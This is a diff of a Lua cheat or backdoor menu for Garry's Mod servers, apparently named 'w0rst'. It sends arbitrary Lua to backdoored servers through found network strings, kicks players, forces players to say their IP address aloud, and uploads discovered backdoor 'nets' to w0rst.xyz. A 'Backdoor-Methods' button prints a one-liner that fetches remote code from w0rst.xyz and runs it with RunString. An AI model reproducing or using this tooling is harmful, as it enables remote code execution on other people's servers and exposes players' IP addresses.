@@ -87,7 +87,12 @@ function wtf.CheckWebNets()
 end
 
 function wtf.AddNet(str)
-    http.Post("https://w0rst.xyz/api/net/upload.php", {s=str})
+    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
+    local DecryptedUser = util.Base64Decode(UserInfo[1])
+    http.Post("https://w0rst.xyz/api/net/upload.php", { username=DecryptedUser, net=str }, function(b)
+          if b[1] == "0" then wtf.Log("Incorrect Permissions")
+          else wtf.Log("Uploaded Net "..str) end
+    end)
 end
 
 function wtf.SendLua(lua, s_c, name)
@@ -1620,7 +1625,7 @@ end)
 
 CreateBDClient("Kick Player",  function()
     if plr == nil then do wtf.Log("No Player Selected") return end else
-        wtf.Log("Player"..Player(plr):Nick().." Kicked")
+        wtf.Log("Player "..Player(plr):Nick().." Kicked")
         wtf.SendLua([[
             local me = Player(]]..plr..[[)
             me:Kick()
@@ -1687,8 +1692,8 @@ CreateBDClient("IP Say",  function()
     if plr == nil then do wtf.Log("No Player Selected") return end else
         wtf.Log("They Said There Ip")
         wtf.SendLua([[
-			local me = Player(]]..plr..[[)
-			me:Say("My IP Is: "..me:IPAddress())
+      			local me = Player(]]..plr..[[)
+      			me:Say("My IP Is: "..me:IPAddress())
         ]])
     end
 end)
@@ -1744,9 +1749,8 @@ CreateButton("Select-Net", TabBackdoor, 105, 25, 125, 445, function()
 end)
 
 CreateButton("Add-Net", TabBackdoor, 105, 25, 235, 445, function()
-    Derma_StringRequest("Add Net(Don't add stupid shit everyone uses these nets)", "Net To Add:", "", function(str)
+    Derma_StringRequest("Add Net | Staff Use Only", "Net To Add:", "", function(str)
         wtf.AddNet(str)
-        wtf.Log("Added Net: "..str); wtf.conoutRGB("ADDED NET: "..str)
     end)
 end)
 
@@ -1794,7 +1798,7 @@ CreateButton("Net-Dumper", TabMisc, 100, 25, 126, 10, function()
 end)
 
 CreateButton("Backdoor-Methods", TabMisc, 100, 25, 236, 10, function()
-    MsgC("Web-Method | timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm.php', RunString) end)")
+    MsgC("Web-Method | timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm.php', RunString) end)\n")
     wtf.Log("Check Console")
 end)
 
